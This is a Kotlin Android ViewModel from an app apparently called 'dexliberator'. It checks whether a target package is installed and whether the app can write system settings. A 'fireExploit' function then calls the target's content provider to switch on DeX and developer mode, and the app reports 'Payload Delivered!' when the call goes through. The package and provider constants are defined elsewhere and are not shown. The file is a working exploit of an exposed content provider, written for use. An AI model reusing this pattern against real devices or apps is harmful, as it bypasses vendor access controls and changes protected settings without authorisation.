package com.example.dexliberator

import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

class MainViewModel : ViewModel() {

    // UI State
    private val _uiState = MutableStateFlow(UiState())
    val uiState: StateFlow<UiState> = _uiState.asStateFlow()

    data class UiState(
        val isDexEnabled: Boolean = true,
        val isDevModeEnabled: Boolean = true,
        val targetInstalled: Boolean = false,
        val hasPermission: Boolean = false,
        val lastMessage: String? = null,
        val isSuccess: Boolean = false
    )

    fun checkTargetInstalled(context: Context) {
        val isInstalled = try {
            context.packageManager.getPackageInfo(ExploitConstants.TARGET_PACKAGE, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
        _uiState.value = _uiState.value.copy(targetInstalled = isInstalled)
    }

    fun checkPermission(context: Context) {
        val hasPerm = android.provider.Settings.System.canWrite(context)
        _uiState.value = _uiState.value.copy(hasPermission = hasPerm)
    }

    fun toggleDex(enabled: Boolean) {
        _uiState.value = _uiState.value.copy(isDexEnabled = enabled)
    }

    fun toggleDevMode(enabled: Boolean) {
        _uiState.value = _uiState.value.copy(isDevModeEnabled = enabled)
    }

    fun fireExploit(contentResolver: ContentResolver) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val providerUri = Uri.parse(ExploitConstants.TARGET_PROVIDER_URI)
                var exploitTriggered = false

                if (_uiState.value.isDexEnabled) {
                    val bundle = Bundle().apply {
                        putString("key", ExploitConstants.KEY_ENABLE_DEX)
                        putString("val", ExploitConstants.VALUE_TRUE)
                    }
                    contentResolver.call(providerUri, ExploitConstants.METHOD_SET_SETTINGS, null, bundle)
                    exploitTriggered = true
                }

                if (_uiState.value.isDevModeEnabled) {
                    val bundle = Bundle().apply {
                        putString("key", ExploitConstants.KEY_ENABLE_DEV_MODE)
                        putString("val", ExploitConstants.VALUE_TRUE)
                    }
                    contentResolver.call(providerUri, ExploitConstants.METHOD_SET_SETTINGS, null, bundle)
                    exploitTriggered = true
                }

                if (exploitTriggered) {
                     _uiState.value = _uiState.value.copy(
                        lastMessage = "Payload Delivered!",
                        isSuccess = true
                    )
                } else {
                     _uiState.value = _uiState.value.copy(
                        lastMessage = "No Payload Selected.",
                        isSuccess = false
                    )
                }

            } catch (e: SecurityException) {
                _uiState.value = _uiState.value.copy(
                    lastMessage = "Permission Denied: ${e.message}",
                    isSuccess = false
                )
            } catch (e: Exception) {
                 _uiState.value = _uiState.value.copy(
                    lastMessage = "Error: ${e.message}",
                    isSuccess = false
                )
            }
        }
    }

    fun clearMessage() {
        _uiState.value = _uiState.value.copy(lastMessage = null)
    }
}
